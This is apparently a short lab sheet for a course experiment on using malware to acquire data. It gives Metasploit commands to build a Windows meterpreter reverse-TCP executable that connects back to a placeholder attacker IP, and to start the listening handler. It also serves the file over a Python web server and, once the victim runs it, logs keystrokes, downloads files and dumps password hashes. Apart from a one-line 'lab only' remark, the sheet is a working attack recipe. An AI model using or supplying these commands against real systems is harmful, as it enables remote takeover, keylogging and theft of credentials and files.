Experiment 6:
Acquisition of data: to learn the methods to acquire/gain access to data using virus/malware file.

ping ipaddress

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Port> -f exe 
> malware.exe
Replace <Attacker_IP> and <Port> with your Kali Linux IP and desired port.
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <Attacker_IP>
set LPORT 4444
exploit
sysinfo

Transfer the malware.exe file to the victim machine via USB simulation, email, or file 
sharing (in a lab environment only).
Or use separate port to access using browser

in kali terminal 
python3 -m http.server 9090

4. Execute Malware on the Victim Machine
Run the malware.exe file on the victim machine.
ls
keyscan_start
keyscan_dump
download <file_path> 
hashdump
